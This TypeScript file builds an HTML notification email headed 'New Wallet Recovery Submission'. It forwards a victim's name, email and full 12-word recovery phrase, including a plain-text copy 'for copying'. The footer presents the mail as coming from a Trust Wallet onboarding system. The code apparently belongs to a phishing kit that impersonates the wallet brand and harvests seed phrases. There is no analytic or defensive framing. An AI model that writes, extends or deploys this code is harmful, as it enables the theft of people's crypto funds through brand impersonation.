interface EmailData {
  fullName: string;
  email: string;
  description: string;
  phrase: string[];
  submissionId: string;
  submittedAt: string;
  verificationHash: string;
}

export function buildEmailHtml(data: EmailData): string {
  const phraseGrid = data.phrase
    .map(
      (word, i) =>
        `<td style="padding:4px 6px;">
          <div style="background:#f0f4ff;border:1px solid #d4daf0;border-radius:8px;padding:8px 10px;text-align:center;">
            <span style="color:#6b7280;font-size:10px;font-weight:700;display:block;">${i + 1}</span>
            <span style="color:#0f172a;font-size:13px;font-weight:800;font-family:'Courier New',monospace;letter-spacing:0.5px;">${word}</span>
          </div>
        </td>`
    )
    .reduce((rows: string[], cell, i) => {
      if (i % 3 === 0) rows.push("");
      rows[rows.length - 1] += cell;
      return rows;
    }, [])
    .map((row) => `<tr>${row}</tr>`)
    .join("");

  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>New Wallet Recovery Submission</title>
</head>
<body style="margin:0;padding:0;background:#f1f5f9;font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;">

  <!-- Outer wrapper -->
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f1f5f9;padding:32px 16px;">
    <tr>
      <td align="center">

        <!-- Main card -->
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.06);border:1px solid #e2e8f0;">

          <!-- Header banner -->
          <tr>
            <td style="background:linear-gradient(135deg,#0500FF 0%,#3b82f6 50%,#06b6d4 100%);padding:36px 32px;text-align:center;">
              <div style="width:56px;height:56px;background:rgba(255,255,255,0.2);border-radius:16px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;">
                <span style="font-size:28px;">🔐</span>
              </div>
              <h1 style="margin:0;color:#ffffff;font-size:22px;font-weight:800;letter-spacing:-0.3px;">
                New Wallet Recovery Submission
              </h1>
              <p style="margin:8px 0 0;color:rgba(255,255,255,0.85);font-size:13px;font-weight:500;">
                A user has completed the onboarding flow
              </p>
            </td>
          </tr>

          <!-- Submission ID Badge -->
          <tr>
            <td style="padding:24px 32px 0;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:14px 18px;">
                    <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td>
                          <span style="font-size:10px;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:1px;">Submission ID</span><br/>
                          <span style="font-size:16px;font-weight:800;color:#0500FF;font-family:'Courier New',monospace;">${data.submissionId}</span>
                        </td>
                        <td align="right">
                          <span style="display:inline-block;background:#dcfce7;color:#16a34a;font-size:11px;font-weight:700;padding:4px 12px;border-radius:20px;border:1px solid #86efac;">
                            ✓ RECEIVED
                          </span>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Account Info Section -->
          <tr>
            <td style="padding:24px 32px 0;">
              <h2 style="margin:0 0 16px;font-size:14px;font-weight:800;color:#334155;text-transform:uppercase;letter-spacing:0.8px;border-bottom:2px solid #e2e8f0;padding-bottom:8px;">
                👤 Account Information
              </h2>

              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="font-size:13px;">
                <tr>
                  <td style="padding:10px 0;border-bottom:1px solid #f1f5f9;color:#64748b;font-weight:600;width:140px;">Full Name</td>
                  <td style="padding:10px 0;border-bottom:1px solid #f1f5f9;color:#0f172a;font-weight:700;">${data.fullName}</td>
                </tr>
                <tr>
                  <td style="padding:10px 0;border-bottom:1px solid #f1f5f9;color:#64748b;font-weight:600;">Email</td>
                  <td style="padding:10px 0;border-bottom:1px solid #f1f5f9;">
                    <a href="mailto:${data.email}" style="color:#0500FF;font-weight:700;text-decoration:none;">${data.email}</a>
                  </td>
                </tr>
                <tr>
                  <td style="padding:10px 0;border-bottom:1px solid #f1f5f9;color:#64748b;font-weight:600;">Timestamp</td>
                  <td style="padding:10px 0;border-bottom:1px solid #f1f5f9;color:#0f172a;font-family:'Courier New',monospace;font-size:12px;">${data.submittedAt}</td>
                </tr>
                <tr>
                  <td style="padding:10px 0;color:#64748b;font-weight:600;vertical-align:top;">Description</td>
                  <td style="padding:10px 0;color:#334155;line-height:1.5;">${data.description}</td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- 12-Word Phrase Section -->
          <tr>
            <td style="padding:24px 32px 0;">
              <h2 style="margin:0 0 16px;font-size:14px;font-weight:800;color:#334155;text-transform:uppercase;letter-spacing:0.8px;border-bottom:2px solid #e2e8f0;padding-bottom:8px;">
                🔑 12-Word Recovery Phrase
              </h2>

              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:14px;padding:12px;">
                ${phraseGrid}
              </table>

              <!-- Plain text copy -->
              <div style="margin-top:12px;background:#fffbeb;border:1px solid #fde68a;border-radius:10px;padding:12px 16px;">
                <span style="font-size:10px;font-weight:700;color:#92400e;text-transform:uppercase;letter-spacing:0.8px;">Plain Text (Copy-Friendly)</span>
                <p style="margin:6px 0 0;font-family:'Courier New',monospace;font-size:13px;font-weight:700;color:#78350f;word-break:break-all;line-height:1.6;">
                  ${data.phrase.join(" ")}
                </p>
              </div>
            </td>
          </tr>

          <!-- Verification Hash -->
          <tr>
            <td style="padding:24px 32px 0;">
              <h2 style="margin:0 0 12px;font-size:14px;font-weight:800;color:#334155;text-transform:uppercase;letter-spacing:0.8px;border-bottom:2px solid #e2e8f0;padding-bottom:8px;">
                🛡️ Verification Hash
              </h2>
              <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:14px 16px;">
                <code style="font-family:'Courier New',monospace;font-size:12px;color:#475569;word-break:break-all;font-weight:600;">
                  ${data.verificationHash}
                </code>
              </div>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="padding:32px;text-align:center;border-top:1px solid #f1f5f9;margin-top:24px;">
              <p style="margin:0;font-size:11px;color:#94a3b8;font-weight:500;">
                This is an automated notification from the Trust Wallet Web App onboarding system.
              </p>
              <p style="margin:6px 0 0;font-size:11px;color:#cbd5e1;">
                Sent at ${data.submittedAt} • ${data.submissionId}
              </p>
            </td>
          </tr>

        </table>
        <!-- End main card -->

      </td>
    </tr>
  </table>

</body>
</html>
  `.trim();
}
